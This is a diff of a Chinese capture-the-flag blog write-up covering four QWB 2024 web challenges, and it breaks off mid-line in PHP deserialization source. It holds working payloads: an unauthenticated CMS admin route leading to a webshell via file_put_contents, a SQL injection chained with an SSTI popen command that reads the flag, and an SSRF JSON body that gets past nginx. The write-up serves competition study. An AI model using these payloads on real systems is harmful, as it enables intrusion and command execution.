 <h1 id="xiaohuanxiong"><a href="#xiaohuanxiong" class="headerlink" title="xiaohuanxiong"></a>xiaohuanxiong</h1><p>废话1：</p>
 <p>&#x2F;search?keyword&#x3D;1 这里sqlmap可以嗦数据库所有内容，但是admin的密码是加盐的md5，无法爆破。</p>
 <p>废话2：拿到小浣熊CMS源码，全局搜admin</p>
-<p><img src="/img/qwb2024/image-20241102175555820.png" alt="image-20241102175555820"></p>
+<p><img src="/img/qwb2024/image-20241102175555820.png" srcset="/img/loading.gif" lazyload alt="image-20241102175555820"></p>
 <p>在admin的登录逻辑，是设置了session为{“xwx_admin”:username}，可爱捏，但是很煞笔捏，哪有网站明文session啊？</p>
 <p>所以我们注册一个账号，手动添加cookie：xwx_admin:Infernity</p>
 <p>然后进去&#x2F;admin&#x2F;admins就可以到后台页面了。</p>
 <h2 id="正文："><a href="#正文：" class="headerlink" title="正文："></a>正文：</h2><p>上面全是错的，根本不需要登录，也不需要cookie，直接就可以他妈的进后台管理页面。</p>
 <p>然后进入&#x2F;admin&#x2F;payment&#x2F;index页面，这里有file_put_contens函数，可以写马进去，这个payment.php会在各个地方都有包含，写个马进去随便找个地方就可以rce了。</p>
-<p><img src="/img/qwb2024/image-20241102180328083.png" alt="image-20241102180328083"></p>
-<p><img src="/img/qwb2024/463bfe36-1624-4920-9010-18dca2a664c1.png" alt="463bfe36-1624-4920-9010-18dca2a664c1"></p>
-<p><img src="/img/qwb2024/66a4ccf3-2497-4c28-a5d6-d12796834f95.png" alt="66a4ccf3-2497-4c28-a5d6-d12796834f95"></p>
+<p><img src="/img/qwb2024/image-20241102180328083.png" srcset="/img/loading.gif" lazyload alt="image-20241102180328083"></p>
+<p><img src="/img/qwb2024/463bfe36-1624-4920-9010-18dca2a664c1.png" srcset="/img/loading.gif" lazyload alt="463bfe36-1624-4920-9010-18dca2a664c1"></p>
+<p><img src="/img/qwb2024/66a4ccf3-2497-4c28-a5d6-d12796834f95.png" srcset="/img/loading.gif" lazyload alt="66a4ccf3-2497-4c28-a5d6-d12796834f95"></p>
 <h1 id="snake"><a href="#snake" class="headerlink" title="snake"></a>snake</h1><p>把每次行动延时改为0.4秒，手打50分就通关了。（打了四遍QAQ）</p>
 <p>setInterval(update, 400);</p>
 <p>胜利页面：<code>/snake_win?username=admin</code>可以xss没啥用</p>
 <p>经过测试发现可以sql注入，数据库是sqllite的：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">/snake_win?username=a&#x27;union select 1,2,sqlite_version()--</span><br></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">/snake_win?username=a<span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,sqlite_version()<span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
 <p>后面查表查数据没找到任何有用的东西，最后发现是结合了ssti。&#x3D;-&#x3D;</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;union select 1,2,(select &quot;&#123;&#123;7*7&#125;&#125;&quot;) --</span><br></pre></td></tr></table></figure>
+<figure class="highlight ada"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs ada">a<span class="hljs-symbol">&#x27;union</span> <span class="hljs-keyword">select</span> <span class="hljs-number">1</span>,<span class="hljs-number">2</span>,(<span class="hljs-keyword">select</span> <span class="hljs-string">&quot;&#123;&#123;7*7&#125;&#125;&quot;</span>) <span class="hljs-comment">--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/qwb2024/42945632-6661-4760-b130-3559fd11e990.png" alt="42945632-6661-4760-b130-3559fd11e990"></p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">a&#x27;union select 1,2,(select &quot;&#123;&#123;().__class__.__base__.__subclasses__()[117].__init__.__globals__[&#x27;popen&#x27;](&#x27;cat /f*&#x27;).read()&#125;&#125;&quot;)--</span><br></pre></td></tr></table></figure>
+<p><img src="/img/qwb2024/42945632-6661-4760-b130-3559fd11e990.png" srcset="/img/loading.gif" lazyload alt="42945632-6661-4760-b130-3559fd11e990"></p>
+<figure class="highlight handlebars"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs handlebars"><span class="language-xml">a&#x27;union select 1,2,(select &quot;</span><span class="hljs-template-variable">&#123;&#123;()<span class="hljs-name">.__class__.__base__.__subclasses__</span>()[117].__init__.__globals__[&#x27;popen&#x27;](<span class="hljs-name">&#x27;cat /f*&#x27;</span>).read()&#125;&#125;</span><span class="language-xml">&quot;)--</span><br></code></pre></td></tr></table></figure>
 
-<p><img src="/img/qwb2024/a2e4f41f-7361-42a5-a884-4ad919838dc0.png" alt="a2e4f41f-7361-42a5-a884-4ad919838dc0"></p>
+<p><img src="/img/qwb2024/a2e4f41f-7361-42a5-a884-4ad919838dc0.png" srcset="/img/loading.gif" lazyload alt="a2e4f41f-7361-42a5-a884-4ad919838dc0"></p>
 <p>有点脑洞了。</p>
-<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">func</span> <span class="title">main</span><span class="params">()</span></span> &#123;</span><br><span class="line">	r := gin.Default()</span><br><span class="line"></span><br><span class="line">	v1 := r.Group(<span class="string">&quot;/v1&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v1.POST(<span class="string">&quot;/api/flag&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			cmd := exec.Command(<span class="string">&quot;/readflag&quot;</span>)</span><br><span class="line">			flag, err := cmd.CombinedOutput()</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line">			c.JSON(http.StatusOK, gin.H&#123;<span class="string">&quot;flag&quot;</span>: flag&#125;)</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	v2 := r.Group(<span class="string">&quot;/v2&quot;</span>)</span><br><span class="line">	&#123;</span><br><span class="line">		v2.POST(<span class="string">&quot;/api/proxy&quot;</span>, <span class="function"><span class="keyword">func</span><span class="params">(c *gin.Context)</span></span> &#123;</span><br><span class="line">			<span class="keyword">var</span> proxyRequest ProxyRequest</span><br><span class="line">			<span class="keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusBadRequest, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Invalid request&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			client := &amp;http.Client&#123;</span><br><span class="line">				CheckRedirect: <span class="function"><span class="keyword">func</span><span class="params">(req *http.Request, via []*http.Request)</span></span> <span class="type">error</span> &#123;</span><br><span class="line">					<span class="keyword">if</span> !req.URL.IsAbs() &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">if</span> !proxyRequest.FollowRedirects &#123;</span><br><span class="line">						<span class="keyword">return</span> http.ErrUseLastResponse</span><br><span class="line">					&#125;</span><br><span class="line"></span><br><span class="line">					<span class="keyword">return</span> <span class="literal">nil</span></span><br><span class="line">				&#125;,</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="type">byte</span>(proxyRequest.Body)))</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> proxyRequest.Headers &#123;</span><br><span class="line">				req.Header.Set(key, value)</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			resp, err := client.Do(req)</span><br><span class="line"></span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			<span class="keyword">defer</span> resp.Body.Close()</span><br><span class="line"></span><br><span class="line">			body, err := io.ReadAll(resp.Body)</span><br><span class="line">			<span class="keyword">if</span> err != <span class="literal">nil</span> &#123;</span><br><span class="line">				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="string">&quot;status&quot;</span>: <span class="string">&quot;error&quot;</span>, <span class="string">&quot;message&quot;</span>: <span class="string">&quot;Internal Server Error&quot;</span>&#125;)</span><br><span class="line">				<span class="keyword">return</span></span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Status(resp.StatusCode)</span><br><span class="line">			<span class="keyword">for</span> key, value := <span class="keyword">range</span> resp.Header &#123;</span><br><span class="line">				c.Header(key, value[<span class="number">0</span>])</span><br><span class="line">			&#125;</span><br><span class="line"></span><br><span class="line">			c.Writer.Write(body)</span><br><span class="line">			c.Abort()</span><br><span class="line">		&#125;)</span><br><span class="line">	&#125;</span><br><span class="line"></span><br><span class="line">	r.Run(<span class="string">&quot;127.0.0.1:8769&quot;</span>)</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<h1 id="Proxy"><a href="#Proxy" class="headerlink" title="Proxy"></a>Proxy</h1><figure class="highlight go"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br></pre></td><td class="code"><pre><code class="hljs go"><span class="hljs-function"><span class="hljs-keyword">func</span> <span class="hljs-title">main</span><span class="hljs-params">()</span></span> &#123;<br>	r := gin.Default()<br><br>	v1 := r.Group(<span class="hljs-string">&quot;/v1&quot;</span>)<br>	&#123;<br>		v1.POST(<span class="hljs-string">&quot;/api/flag&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>			cmd := exec.Command(<span class="hljs-string">&quot;/readflag&quot;</span>)<br>			flag, err := cmd.CombinedOutput()<br>			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br>				<span class="hljs-keyword">return</span><br>			&#125;<br>			c.JSON(http.StatusOK, gin.H&#123;<span class="hljs-string">&quot;flag&quot;</span>: flag&#125;)<br>		&#125;)<br>	&#125;<br><br>	v2 := r.Group(<span class="hljs-string">&quot;/v2&quot;</span>)<br>	&#123;<br>		v2.POST(<span class="hljs-string">&quot;/api/proxy&quot;</span>, <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(c *gin.Context)</span></span> &#123;<br>			<span class="hljs-keyword">var</span> proxyRequest ProxyRequest<br>			<span class="hljs-keyword">if</span> err := c.ShouldBindJSON(&amp;proxyRequest); err != <span class="hljs-literal">nil</span> &#123;<br>				c.JSON(http.StatusBadRequest, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Invalid request&quot;</span>&#125;)<br>				<span class="hljs-keyword">return</span><br>			&#125;<br><br>			client := &amp;http.Client&#123;<br>				CheckRedirect: <span class="hljs-function"><span class="hljs-keyword">func</span><span class="hljs-params">(req *http.Request, via []*http.Request)</span></span> <span class="hljs-type">error</span> &#123;<br>					<span class="hljs-keyword">if</span> !req.URL.IsAbs() &#123;<br>						<span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>					&#125;<br><br>					<span class="hljs-keyword">if</span> !proxyRequest.FollowRedirects &#123;<br>						<span class="hljs-keyword">return</span> http.ErrUseLastResponse<br>					&#125;<br><br>					<span class="hljs-keyword">return</span> <span class="hljs-literal">nil</span><br>				&#125;,<br>			&#125;<br><br>			req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]<span class="hljs-type">byte</span>(proxyRequest.Body)))<br>			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br>				<span class="hljs-keyword">return</span><br>			&#125;<br><br>			<span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> proxyRequest.Headers &#123;<br>				req.Header.Set(key, value)<br>			&#125;<br><br>			resp, err := client.Do(req)<br><br>			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br>				<span class="hljs-keyword">return</span><br>			&#125;<br><br>			<span class="hljs-keyword">defer</span> resp.Body.Close()<br><br>			body, err := io.ReadAll(resp.Body)<br>			<span class="hljs-keyword">if</span> err != <span class="hljs-literal">nil</span> &#123;<br>				c.JSON(http.StatusInternalServerError, gin.H&#123;<span class="hljs-string">&quot;status&quot;</span>: <span class="hljs-string">&quot;error&quot;</span>, <span class="hljs-string">&quot;message&quot;</span>: <span class="hljs-string">&quot;Internal Server Error&quot;</span>&#125;)<br>				<span class="hljs-keyword">return</span><br>			&#125;<br><br>			c.Status(resp.StatusCode)<br>			<span class="hljs-keyword">for</span> key, value := <span class="hljs-keyword">range</span> resp.Header &#123;<br>				c.Header(key, value[<span class="hljs-number">0</span>])<br>			&#125;<br><br>			c.Writer.Write(body)<br>			c.Abort()<br>		&#125;)<br>	&#125;<br><br>	r.Run(<span class="hljs-string">&quot;127.0.0.1:8769&quot;</span>)<br>&#125;<br></code></pre></td></tr></table></figure>
 
 <p>获取flag的路由在<code>/v1/api/readflag</code></p>
 <p>但是nginx限制了<code>/v1</code>路由的访问</p>
-<p><img src="/img/qwb2024/7b01c938-7b34-4e02-b3c9-606952c15ec3.png" alt="7b01c938-7b34-4e02-b3c9-606952c15ec3"></p>
+<p><img src="/img/qwb2024/7b01c938-7b34-4e02-b3c9-606952c15ec3.png" srcset="/img/loading.gif" lazyload alt="7b01c938-7b34-4e02-b3c9-606952c15ec3"></p>
 <p>但是<code>/v2/api/proxy</code>这个路由可以构造一个url请求，绕过中间件去访问<code>/v1/api/readflag</code>：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">req, err := http.NewRequest(proxyRequest.Method, proxyRequest.URL, bytes.NewReader([]byte(proxyRequest.Body)))</span><br></pre></td></tr></table></figure>
+<figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs stylus">req, err := http<span class="hljs-selector-class">.NewRequest</span>(proxyRequest<span class="hljs-selector-class">.Method</span>, proxyRequest<span class="hljs-selector-class">.URL</span>, bytes<span class="hljs-selector-class">.NewReader</span>(<span class="hljs-selector-attr">[]</span><span class="hljs-built_in">byte</span>(proxyRequest.Body)))<br></code></pre></td></tr></table></figure>
 
 <p>所以只需要v2 发一个post请求过去就行：</p>
-<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">&#123;&quot;URL&quot;:&quot;http://127.0.0.1:8769/v1/api/flag&quot;,&quot;Method&quot;:&quot;POST&quot;,&quot;Body&quot;:&quot;&quot;&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs json"><span class="hljs-punctuation">&#123;</span><span class="hljs-attr">&quot;URL&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;http://127.0.0.1:8769/v1/api/flag&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Method&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;POST&quot;</span><span class="hljs-punctuation">,</span><span class="hljs-attr">&quot;Body&quot;</span><span class="hljs-punctuation">:</span><span class="hljs-string">&quot;&quot;</span><span class="hljs-punctuation">&#125;</span><br></code></pre></td></tr></table></figure>
 
-<img src="/img/qwb2024/image-20241103135058428.png" alt="image-20241103135058428" style="zoom:67%;" />
+<img src="/img/qwb2024/image-20241103135058428.png" srcset="/img/loading.gif" lazyload alt="image-20241103135058428" style="zoom:67%;" />
 
 <p>flag{a156a702-6a71-4ebe-83bf-8cb7492c913f}</p>
 <h1 id="Password-Game"><a href="#Password-Game" class="headerlink" title="Password Game"></a>Password Game</h1><p>他会要求你的密码满足以下几个条件：</p>
@@ -389,746 +373,425 @@
 <li>请密码中包含下列算式的解(如有除法，则为整除): xxxx &#x2F; xxx</li>
 </ol>
 <p>密码都满足后，会给一个源码：</p>
-<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">function</span> <span class="title">filter</span>(<span class="params"><span class="variable">$password</span></span>)</span>&#123;</span><br><span class="line">    <span class="variable">$filter_arr</span> = <span class="keyword">array</span>(<span class="string">&quot;admin&quot;</span>,<span class="string">&quot;2024qwb&quot;</span>);</span><br><span class="line">    <span class="variable">$filter</span> = <span class="string">&#x27;/&#x27;</span>.<span class="title function_ invoke__">implode</span>(<span class="string">&quot;|&quot;</span>,<span class="variable">$filter_arr</span>).<span class="string">&#x27;/i&#x27;</span>;</span><br><span class="line">    <span class="keyword">return</span> <span class="title function_ invoke__">preg_replace</span>(<span class="variable">$filter</span>,<span class="string">&quot;nonono&quot;</span>,<span class="variable">$password</span>);</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">guest</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__tostring</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="string">&quot;guest&quot;</span>)&#123;</span><br><span class="line">            <span class="variable">$value</span>();</span><br><span class="line">        &#125;</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__call</span>(<span class="params"><span class="variable">$key</span>,<span class="variable">$value</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;username==<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]))&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">root</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__get</span>(<span class="params"><span class="variable">$key</span></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable language_">$this</span>-&gt;value == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">            <span class="variable language_">$this</span>-&gt;value = <span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>];</span><br><span class="line">            <span class="keyword">echo</span> <span class="title function_ invoke__">md5</span>(<span class="string">&quot;hello:&quot;</span>.<span class="variable">$this</span>-&gt;value);</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="class"><span class="keyword">class</span> <span class="title">user</span></span>&#123;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$username</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$password</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="variable">$value</span>;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__invoke</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="variable language_">$this</span>-&gt;username=<span class="title function_ invoke__">md5</span>(<span class="variable">$GLOBALS</span>[<span class="string">&quot;flag&quot;</span>]);</span><br><span class="line">        <span class="keyword">return</span> <span class="variable language_">$this</span>-&gt;password-&gt;<span class="title function_ invoke__">guess</span>();</span><br><span class="line">    &#125;</span><br><span class="line">    <span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">__destruct</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$this</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> )&#123;</span><br><span class="line">            <span class="keyword">echo</span> <span class="string">&quot;hello&quot;</span>.<span class="variable language_">$this</span>-&gt;username;</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br><span class="line"><span class="variable">$user</span>=<span class="title function_ invoke__">unserialize</span>(<span class="title function_ invoke__">filter</span>(<span class="variable">$_POST</span>[<span class="string">&quot;password&quot;</span>]));</span><br><span class="line"><span class="keyword">if</span>(<span class="title function_ invoke__">strpos</span>(<span class="variable">$user</span>-&gt;username, <span class="string">&quot;admin&quot;</span>) == <span class="number">0</span> &amp;&amp; <span class="variable">$user</span>-&gt;password == <span class="string">&quot;2024qwb&quot;</span>)&#123;</span><br><span class="line">    <span class="keyword">echo</span> <span class="string">&quot;hello!&quot;</span>;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+<figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-function"><span class="hljs-keyword">function</span> <span class="hljs-title">filter</span>(<span class="hljs-params"><span class="hljs-variable">$password</span></span>)</span>&#123;<br>    <span class="hljs-variable">$filter_arr</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;admin&quot;</span>,<span class="hljs-string">&quot;2024qwb&quot;</span>);<br>    <span class="hljs-variable">$filter</span> = <span class="hljs-string">&#x27;/&#x27;</span>.<span class="hljs-title function_ invoke__">implode</span>(<span class="hljs-string">&quot;|&quot;</span>,<span class="hljs-variable">$filter_arr</span>).<span class="hljs-string">&#x27;/i&#x27;</span>;<br>    <span 